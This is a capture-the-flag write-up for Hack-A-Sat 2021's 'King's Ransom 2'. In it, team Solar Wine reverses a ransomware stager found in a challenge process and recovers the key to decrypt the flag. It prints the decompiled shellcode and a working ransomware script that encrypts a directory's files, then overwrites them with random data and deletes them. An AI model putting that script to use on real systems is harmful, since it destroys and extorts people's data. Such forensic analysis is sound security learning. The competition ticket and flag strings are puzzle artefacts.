# HACK-A-SAT 2021: King's Ransom 2

* **Category:** Presents from Marco
* **Points:** 304
* **Solves:** 5
* **Description:**

> A vulnerable service with your "bank account" information running on the target system. Too bad it has already been exploited by a piece of ransomware. The ransomware took over the target, encrypted some files on the file system, and resumed the executive loop.
>
> Follow the footsteps.
>
> Ticket
>
> Present this ticket when connecting to the challenge:
>
> ticket{victor649460delta2:GJ2NF_z7(...)GCWhRFsQ}
>
> Don't share your ticket with other teams.
>
> Connecting
>
> Connect to the challenge on:
>
> star-power.satellitesabove.me:5011
>
> Using netcat, you might run:
> nc star-power.satellitesabove.me 5011
>
> Files
>
> You'll need these files to solve the challenge.
>
> https://static.2021.hackasat.com/lyj5rhtjfw992dn0f976ra4aglss
>
> https://static.2021.hackasat.com/t5qefn4567j7zpld6xuqrhay6hlj

The files are the same as for the first challenge (King's Ransom).

## Write-up

_Write-up by Solar Wine team_

We improved the previous exploit to `fork` + `execve` to avoid killing the `challenge` process then analyzed the process' memory.

The attacker who exploited the vulnerability created a RWX mapping and put their shellcode there.
The address of this mapping can be seen in `/proc/$PID/maps`, for example here at offset `0x7f7fb895d000`:

```console
$ cat /proc/9/maps
00400000-00401000 r--p 00000000 103:01 293221                            /challenge/challenge
00401000-00402000 r-xp 00001000 103:01 293221                            /challenge/challenge
00402000-00403000 r--p 00002000 103:01 293221                            /challenge/challenge
00403000-00404000 r--p 00002000 103:01 293221                            /challenge/challenge
00404000-00405000 rw-p 00003000 103:01 293221                            /challenge/challenge
015ef000-01610000 rw-p 00000000 00:00 0                                  [heap]
12800000-12801000 rwxp 00000000 00:00 0 
7f7fb873b000-7f7fb8760000 r--p 00000000 103:01 527170                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7fb8760000-7f7fb88d8000 r-xp 00025000 103:01 527170                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7fb88d8000-7f7fb8922000 r--p 0019d000 103:01 527170                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7fb8922000-7f7fb8923000 ---p 001e7000 103:01 527170                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7fb8923000-7f7fb8926000 r--p 001e7000 103:01 527170                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7fb8926000-7f7fb8929000 rw-p 001ea000 103:01 527170                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7fb8929000-7f7fb892f000 rw-p 00000000 00:00 0 
7f7fb8931000-7f7fb8932000 r--p 00000000 103:01 527148                    /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f7fb8932000-7f7fb8955000 r-xp 00001000 103:01 527148                    /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f7fb8955000-7f7fb895d000 r--p 00024000 103:01 527148                    /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f7fb895d000-7f7fb895e000 rwxp 00000000 00:00 0 
7f7fb895e000-7f7fb895f000 r--p 0002c000 103:01 527148                    /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f7fb895f000-7f7fb8960000 rw-p 0002d000 103:01 527148                    /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f7fb8960000-7f7fb8961000 rw-p 00000000 00:00 0 
7ffd6dde3000-7ffd6de04000 rw-p 00000000 00:00 0                          [stack]
7ffd6de86000-7ffd6de89000 r--p 00000000 00:00 0                          [vvar]
7ffd6de89000-7ffd6de8a000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

This shellcode is nonetheless a stager which creates some files and executes them.
Here is its decompiled output (using Ghidra):

```c
int iVar1;
__pid_t _Var2;
char *pcVar3;
void *pvVar4;

pcVar3 = (char *)malloc(0x20);
read(0,pcVar3,0x20);                    // Receive "/challenge/gen"
pvVar4 = malloc(0x80);
iVar1 = open(pcVar3,0x241,0x1c0,open);
read(0,pvVar4,0x80);                    // Receive the script to generate the key
write(iVar1,pvVar4,0x80);
close(iVar1);
_Var2 = fork();
if (_Var2 == 0) {
    execl(pcVar3,(char *)0x0,execl);    // Generate /challenge/key
}
waitpid(_Var2,(int *)0x0,0);
pcVar3 = (char *)malloc(0x20);
read(0,pcVar3,0x20);                    // Receive "/challenge/key"
iVar1 = open(pcVar3,0,0,open);
pvVar4 = malloc(0x40);
read(iVar1,pvVar4,0x40);                // Read the generated key (into memory)
write(1,pvVar4,0x40);
pcVar3 = (char *)malloc(0x20);
read(0,pcVar3,0x20);                    // Receive "/challenge/ransom"
pvVar4 = malloc(0x400);
read(0,pvVar4,0x400);
iVar1 = open(pcVar3,0x241,0x1c0,open);
write(iVar1,pvVar4,0x400);              // Receive the script to encrypt files
close(iVar1);
_Var2 = fork();
if (_Var2 == 0) {
    execl(pcVar3,(char *)0x0,execl);    // Encrypt the files
}
waitpid(_Var2,(int *)0x0,0);
(*(code *)0x401906)();                  // Jump back to challenge
```

Using `malloc` ourselves, we were able to recover the location of the heap of the challenge process and its content.
With this, we understood what the shellcode did, which is what we documented in the previous decompiled output.

In the recovered heap you can find a partial flag (missing the 21 last bytes) but also the command used to generate the encryption key (which was saved in file `/challenge/gen`):

```sh
#!/bin/sh
echo "$(echo '77ef3e4ce2b23c4406ec65b5c409ced891fbbe51')$(domainname -A)"|sha256sum|cut -d' ' -f1>/challenge/key
```

There is also the script which was used to encrypt all the files, which is still present in file `/challenge/ransom`:

```sh
#!/bin/bash
for f in /challenge/bank/*;do
openssl enc -aes-256-cbc -a -pbkdf2 -in "$f" -out "$f".enc -k $(cat /challenge/key)
dd if=/dev/urandom of=$f bs=1024 count=10
rm "$f"
done
for f in /challenge/{gen,key,exploit.bin}; do
dd if=/dev/urandom of=$f bs=1024 count=10
rm $f
done
```

This is more than enough to recover the key and to decrypt `flag2.txt.enc`:

```console
$ cat bank/flag2.txt.enc
U2FsdGVkX1/qasm7NzUaxioaEKpPc1KYSb4mJbopb4cBlVP2tos3iQ+HDGo9Vakd
KfjhvvmwIhrbS7bKPB4jWaiHcMEk4DDll+TJfrZolKyJ2jtlCCNHCDnmcnu24ULr
KCnvIpMw/IoHQbVqVlOdB+3BU/oDQiFwoIIH8jmIvLK311aNn2USc5eRj8NQ3l3I

$ domainname -A
ab451d1fba3b

$ echo "77ef3e4ce2b23c4406ec65b5c409ced891fbbe51""ab451d1fba3b "|sha256sum
94a35e6250b4740c549282b5cdcb8bbd9f2c99343b6c3c70f352ebfffe7db936  -

$ openssl enc -d -aes-256-cbc -a -pbkdf2 -in bank/flag2.txt.enc -k 94a35e6250b4740c549282b5cdcb8bbd9f2c99343b6c3c70f352ebfffe7db936
flag{victor649460delta2:GHhxM2qETDTtvSfh5iavUAXT53jgiB2ZwbfdvR-X7_hUqozqL8Ems6zCd48ORujGD7VD5OQdY9gJriZ2cEJOq5g}
```

Then we found out that running `cat /proc/1/environ` yields, the flag, and cried a little.
